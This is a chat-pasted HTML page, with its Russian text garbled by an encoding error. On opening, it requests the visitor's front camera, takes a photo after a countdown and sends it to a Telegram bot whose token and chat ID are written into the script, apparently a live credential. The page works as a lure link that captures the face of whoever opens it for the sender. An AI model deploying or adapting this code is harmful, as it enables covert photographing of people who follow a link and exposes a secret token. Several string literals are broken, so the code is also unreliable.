üòÉ, [20.10.2025 1:31]
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ê–≤—Ç–æ-—Ñ–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–∫–∞</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            margin: 0;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        
        #status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 8px;
            font-weight: bold;
        }
        
        .success { background: rgba(76, 175, 80, 0.3); }
        .error { background: rgba(244, 67, 54, 0.3); }
        .loading { background: rgba(33, 150, 243, 0.3); }
        
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        video {
            border-radius: 10px;
            margin: 20px 0;
            max-width: 100%;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üì∏ –ê–≤—Ç–æ-—Ñ–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–∫–∞</h1>
        <p>–†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ - —Ñ–æ—Ç–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–¥–µ–ª–∞–µ—Ç—Å—è –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—Å—è</p>
        
        <div id="status" class="loading">
            üîÑ –ó–∞–ø—Ä–∞—à–∏–≤–∞—é –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ...
        </div>
        
        <div class="loader" id="loader"></div>
        
        <video id="camera" autoplay playsinline></video>
        
        <div id="countdown" style="font-size: 24px; margin: 20px 0;"></div>
    </div>

    <script>
        // ================== –ù–ê–°–¢–†–û–ô–ö–ò ==================
        // –ó–ê–ú–ï–ù–ò–¢–ï –≠–¢–ò –î–ê–ù–ù–´–ï –ù–ê –°–í–û–ò!
        const BOT_TOKEN = '8283462960:AAEfyjMymBxUREYzkyScLEW1StCJlSZHdYQ';
        const YOUR_CHAT_ID = '8228130717';
        // ===============================================

        const video = document.getElementById('camera');
        const statusEl = document.getElementById('status');
        const loader = document.getElementById('loader');
        const countdownEl = document.getElementById('countdown');

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞
        function updateStatus(message, type = 'loading') {
            statusEl.textContent = message;
            statusEl.className = type;
        }

        // –§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –æ—Ç—Å—á–µ—Ç–∞
        function startCountdown(seconds) {
            return new Promise((resolve) => {
                let count = seconds;
                countdownEl.textContent = üì∏ –°–Ω–∏–º–æ–∫ —á–µ—Ä–µ–∑: ${count}—Å;
                
                const interval = setInterval(() => {
                    count--;
                    countdownEl.textContent = üì∏ –°–Ω–∏–º–æ–∫ —á–µ—Ä–µ–∑: ${count}—Å;
                    
                    if (count <= 0) {
                        clearInterval(interval);
                        countdownEl.textContent = 'üì∏ –î–µ–ª–∞—é —Å–Ω–∏–º–æ–∫...';
                        resolve();
                    }
                }, 1000);
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –≤ Telegram
        async function sendPhotoToTelegram(blob) {
            updateStatus('üì§ –û—Ç–ø—Ä–∞–≤–ª—è—é —Ñ–æ—Ç–æ –≤ Telegram...', 'loading');
            
            const formData = new FormData();
            formData.append('chat_id', 8228130717);
            formData.append('photo', blob, 'auto_selfie.jpg');
            formData.append('caption', `ü§ñ –ê–≤—Ç–æ-—Ñ–æ—Ç–æ\nüìÖ ${new Date().toLocaleString()}\nüåê –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —á–µ—Ä–µ–∑ –≤–µ–±-—Å—Å—ã–ª–∫—É`);

            try {

üòÉ, [20.10.2025 1:31]
const response = await fetch(`https://api.telegram.org/bot8283462960:AAEfyjMymBxUREYzkyScLEW1StCJlSZHdYQ/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    updateStatus('‚úÖ –§–æ—Ç–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram! –ó–∞–∫—Ä–æ–π—Ç–µ —ç—Ç—É —Å—Ç—Ä–∞–Ω–∏—Ü—É.', 'success');
                    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–µ–≤—å—é –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω–æ–≥–æ —Ñ–æ—Ç–æ
                    if (data.result.photo) {
                        const photoUrl = https://api.telegram.org/file/bot$8283462960:AAEfyjMymBxUREYzkyScLEW1StCJlSZHdYQ}/${data.result.photo[2].file_path};
                        console.log('–§–æ—Ç–æ –¥–æ—Å—Ç—É–ø–Ω–æ –ø–æ —Å—Å—ã–ª–∫–µ:', photoUrl);
                    }
                } else {
                    throw new Error(data.description || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏');
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                updateStatus(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`, 'error');
            } finally {
                loader.style.display = 'none';
            }
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Å–æ–∑–¥–∞–Ω–∏–µ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ
        async function autoCaptureAndSend() {
            try {
                updateStatus('üìπ –ü–æ–¥–∫–ª—é—á–∞—é—Å—å –∫ –∫–∞–º–µ—Ä–µ...', 'loading');
                
                // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä–µ
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                video.srcObject = stream;
                video.style.display = 'block';
                
                updateStatus('‚úÖ –ö–∞–º–µ—Ä–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞! –ì–æ—Ç–æ–≤–ª—é—Å—å –∫ —Å—ä–µ–º–∫–µ...', 'success');
                
                // –ñ–¥–µ–º –ø–æ–∫–∞ –∫–∞–º–µ—Ä–∞ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—Å—è
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // –û–±—Ä–∞—Ç–Ω—ã–π –æ—Ç—Å—á–µ—Ç 3 —Å–µ–∫—É–Ω–¥—ã
                await startCountdown(3);
                
                // –°–æ–∑–¥–∞–µ–º canvas –¥–ª—è —Ñ–æ—Ç–æ
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // –û—Ç—Ä–∞–∂–∞–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è —Å–µ–ª—Ñ–∏
                context.translate(canvas.width, 0);
                context.scale(-1, 1);
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                
                // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ JPG –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
                canvas.toBlob(blob => {
                    sendPhotoToTelegram(blob);
                }, 'image/jpeg', 0.9);
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞:', error);
                updateStatus(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`, 'error');
                loader.style.display = 'none';
            }
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        document.addEventListener('DOMContentLoaded', () => {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–¥–µ—Ä–∂–∫—É –∫–∞–º–µ—Ä—ã
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                updateStatus('‚ùå –í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ', 'error');
                return;
            }
            
            // –ù–∞—á–∏–Ω–∞–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å
            autoCaptureAndSend();
        });
    </script>
</body>
</html>
